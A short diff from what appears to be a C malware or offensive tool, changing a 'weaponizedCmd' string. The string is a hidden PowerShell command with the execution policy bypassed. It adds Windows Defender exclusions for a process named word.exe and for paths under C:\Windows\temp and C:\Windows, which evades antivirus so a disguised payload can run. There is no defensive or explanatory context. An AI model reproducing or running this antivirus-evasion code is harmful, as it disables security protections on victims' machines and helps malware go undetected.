@@ -151,7 +151,7 @@ int main() {
 
     // 4. BUILD COMMAND
     swprintf_s(weaponizedCmd, 2048, 
-        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\';Add-MpPreference -ExclusionPath 'C:\\' \"");
+        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\' \"");
 
     printf("[DEBUG] Target: %ws\n", targetPath);
     printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);
